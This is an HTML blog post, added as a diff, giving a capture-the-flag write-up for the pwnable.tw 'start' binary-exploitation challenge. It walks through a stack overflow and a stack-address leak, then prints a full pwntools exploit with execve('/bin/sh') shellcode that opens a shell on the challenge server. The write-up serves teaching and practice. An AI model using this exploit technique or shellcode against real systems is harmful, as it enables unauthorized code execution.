@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+<meta content="pwnable.tw - start" property="og:title"/>
+<meta content="article" property="og:type"/>
+<meta content="2019-11-22T18:30:01.515Z" property="og:published_time"/>
+<meta content="2019-11-23T19:32:29.189Z" property="og:modified_time"/>
+<meta content="Srikavin Ramkumar" property="og:author"/>
+<meta content="ctf-writeups" property="og:section"/>
+<meta content="pwnable.tw" property="og:tag"/>
+<meta content="binary-exploitation" property="og:tag"/>
+<meta content="pwntools" property="og:tag"/>
+<meta content="shellcode" property="og:tag"/>
+<meta content="/posts/pwnable-tw-start/" property="og:url"/>
+
+    <title>pwnable.tw - start - srikavin.me</title>
+    <link rel="stylesheet" href="/bundle.css">
+</head>
+
+<body>
+<nav>
+    <div class="nav-left">
+        <span>
+            <a href="https://srikavin.me" class="name">Srikavin Ramkumar</a>
+        </span>
+        <span>
+            <a href="/posts" class="nav-link">Posts</a>
+        </span>
+        <span>
+            <a class="nav-link" href="/tags">Tags</a>
+        </span>
+    </div>
+</nav>
+<section class="section">
+    <div class="container">
+        
+
+<div class="blog-container">
+    
+
+
+<div class="blog-header">
+    <h1 class="title">
+        
+        pwnable.tw - start
+        
+    </h1>
+    <div class="subtitle">
+                    <span>Posted on
+                        <span class="date" title="Created: 2019-11-22T18:30:01.515Z&#10;Updated: 2019-11-23T19:32:29.189Z">November 22, 2019*
+                        </span>
+
+                        in ctf-writeups
+                        
+                </span>
+    </div>
+    <div class="tags">
+        
+        
+        <a href="&#x2F;tags&#x2F;pwnable-tw&#x2F;"><span class="tag minimal interactive">pwnable.tw</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;binary-exploitation&#x2F;"><span class="tag minimal interactive">binary-exploitation</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;pwntools&#x2F;"><span class="tag minimal interactive">pwntools</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;shellcode&#x2F;"><span class="tag minimal interactive">shellcode</span></a>
+        
+    </div>
+</div>
+
+
+<div class="blog-content light">
+    <div class="blog-scrollspy">
+        <h1 class="scrollspy-label">Table of Contents</h1>
+        <ul>
+            
+        </ul>
+    </div>
+
+    <p>We are given a linux binary. To start off, lets run <code>checksec</code> on it:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="color:#323232;">Arch:     i386-32-little
+RELRO:    No RELRO
+Stack:    No canary found
+NX:       NX disabled
+PIE:      No PIE (0x8048000)
+</span></code></pre>
+<p>It looks like NX is disabled, so if needed, we can place and execute shell code from the stack. To understand how this 
+binary works, I opened it with <code>Ghidra</code>. There are only two functions, <code>_entry</code> and <code>_exit</code>. Let's look at <code>_entry</code> first. 
+Although the decompilation is mostly useless, the disassembly is more than enough.</p>
+<p><img src="/posts/pwnable-tw-start/5cff109009821b08235e212a.png" alt="" /></p>
+<p>We can see two <code>int 0x80</code>s that are syscalls. Looking at the value of <code>eax</code> and by referencing a 
+<a href="https://www.informatik.htw-dresden.de/%7Ebeck/ASM/syscall_list.html">32-bit syscall table</a>, we can identify them. The 
+reversed syscalls are shown in comments in the above screenshot. It's also clear that we control <code>EIP</code> due to the large 
+<code> read</code> syscall that will overflow into the save return address on the stack.</p>
+<p>As we saw earlier, the <code>NX</code> bit is disabled, so we can jump to our shellcode. To do so, we need to leak a stack address 
+to identify where to jump to. Using <a href="https://github.com/pwndbg/pwndbg">pwndbg</a>, it's easy to watch the stack during 
+execution.</p>
+<span id="continue-reading"></span>
+<p><img src="/posts/pwnable-tw-start/5cff13e309821b08235e212c.png" alt="" /></p>
+<p>The first value that is pushed onto the stack is <code>ESP</code> (<code>0x8048060</code>). If we were to read past the values pushed onto the 
+stack, we'll be able to leak a stack address. What happens if we return to <code>0x8048087</code>? Since the <code>ADD ESP, 0x14</code> before 
+the <code>RET</code> will clear the stack, the <code>write</code> syscall will print out a stack address. After leaking the stack address, we 
+know that we will write our shell code 20 bytes after the base pointer. We need to return to <code>ESP + 0x14</code>. Let's try it 
+out.</p>
+<p>I'll use <code>pwntools</code> to ease communications with the binary. </p>
+<pre style="background-color:#ffffff;">
+<code><span style="color:#323232;">
+</span><span style="font-weight:bold;color:#a71d5d;">from </span><span style="color:#323232;">pwn </span><span style="font-weight:bold;color:#a71d5d;">import </span><span style="color:#0086b3;">*
+
+</span><span style="color:#323232;">context.terminal </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&#39;/bin/sh&#39;
+
+
+</span><span style="color:#0086b3;">WRITE_ADDR </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">0x8048087
+
+</span><span style="color:#323232;">r </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">remote(</span><span style="color:#183691;">&#39;chall.pwnable.tw&#39;</span><span style="color:#323232;">, </span><span style="color:#0086b3;">10000</span><span style="color:#323232;">)
+
+r.recvuntil(</span><span style="color:#183691;">&#39;:&#39;</span><span style="color:#323232;">)
+
+
+payload </span><span style="font-weight:bold;color:#a71d5d;">=  </span><span style="color:#183691;">&#39;A&#39;</span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#0086b3;">0x14        </span><span style="font-style:italic;color:#969896;"># Padding
+</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(</span><span style="color:#0086b3;">WRITE_ADDR</span><span style="color:#323232;">) </span><span style="font-style:italic;color:#969896;"># Overwrite EIP with the write syscall
+
+</span><span style="color:#323232;">r.write(payload)
+
+</span><span style="color:#0086b3;">LEAKED_ADDR </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">u32(r.read(</span><span style="color:#0086b3;">400</span><span style="color:#323232;">)[:</span><span style="color:#0086b3;">4</span><span style="color:#323232;">])
+
+log.info(</span><span style="color:#183691;">&quot;Leaked address 0x</span><span style="color:#0086b3;">%x</span><span style="color:#183691;">&quot; </span><span style="font-weight:bold;color:#a71d5d;">% </span><span style="color:#0086b3;">LEAKED_ADDR</span><span style="color:#323232;">)
+
+</span><span style="font-weight:bold;color:#a71d5d;">from </span><span style="color:#323232;">binascii </span><span style="font-weight:bold;color:#a71d5d;">import </span><span style="color:#323232;">unhexlify
+</span><span style="font-style:italic;color:#969896;"># http://shell-storm.org/shellcode/files/shellcode-811.php
+</span><span style="color:#323232;">shellcode </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&quot;</span><span style="color:#0086b3;">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span style="color:#183691;">&quot;
+
+</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">=  </span><span style="color:#183691;">&#39;A&#39;</span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#0086b3;">0x14
+</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(</span><span style="color:#0086b3;">LEAKED_ADDR </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">0x14</span><span style="color:#323232;">)
+payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">shellcode
+payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#183691;">&#39;ls</span><span style="color:#0086b3;">\n</span><span style="color:#183691;">&#39;
+</span><span style="color:#323232;">r.write(payload)
+
+r.interactive()
+</span></code></pre>
+<p>This gives us a shell, and if we explore the server, we will find the flag in <code>/home/start/flag</code>.</p>
+
+</div>
+
+
+</div>
+
+<script src="https://utteranc.es/client.js"
+        repo="srikavin/blog"
+        issue-term="url"
+        label="💬comments"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+
+    </div>
+</section>
+
+<script src="/bundle.js"></script>
+ 
+
+</body>
+
+</html>
